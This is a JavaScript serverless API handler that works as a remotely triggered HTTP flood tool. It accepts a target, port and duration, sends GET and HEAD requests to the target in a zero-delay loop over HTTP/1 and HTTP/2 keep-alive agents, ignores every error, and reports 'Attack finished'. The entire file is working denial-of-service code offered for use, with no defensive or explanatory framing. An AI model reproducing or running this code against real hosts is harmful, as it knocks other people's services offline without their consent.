import http from 'http';
import https from 'https';
import http2 from 'http2-wrapper';

export default async function handler(req, res) {
  if (req.method === 'POST' || req.method === 'GET') {
    const params = req.method === 'POST' ? req.body : req.query;
    const target = params.target;
    const time = params.time;
    const port = params.port;
    
    if (!target || !time || !port) {
      res.status(400).send('Missing parameters');
      return;
    }

    let targetUrl;
    try {
      targetUrl = new URL(target);
      if (!['http:', 'https:'].includes(targetUrl.protocol)) {
        targetUrl = new URL(`http://${target}`);
      }
    } catch {
      targetUrl = new URL(`http://${target}`);
    }

    const attackTime = parseInt(time, 10);
    const attackPort = parseInt(port, 10);

    if (isNaN(attackTime) || isNaN(attackPort)) {
      res.status(400).send('Invalid time or port');
      return;
    }

    const protocol = targetUrl.protocol === 'https:' ? 'https' : 'http';
    const host = targetUrl.hostname;
    const path = targetUrl.pathname;

    const http2Agent = new http2.Agent({});
    const agents = {
      http: new http.Agent({ keepAlive: true }),
      https: new https.Agent({ keepAlive: true }),
      http2: http2Agent
    };

    const sendRequest = () => {
      const method = Math.random() < 0.5 ? 'GET' : 'HEAD';
      const useHttp2 = Math.random() < 0.5;
      const options = {
        hostname: host,
        port: attackPort || (protocol === 'https' ? 443 : 80),
        path: path,
        method: method,
        agent: useHttp2 ? agents.http2 : agents[protocol]
      };
      const client = protocol === 'https' ? https : http;
      const req = client.request(options);
      req.on('error', () => {});
      req.end();
    };

    const interval = setInterval(sendRequest, 0);
    setTimeout(() => {
      clearInterval(interval);
      res.status(200).send('Attack finished');
    }, attackTime * 1000);
  } else {
    res.status(405).send('Method not allowed');
  }
}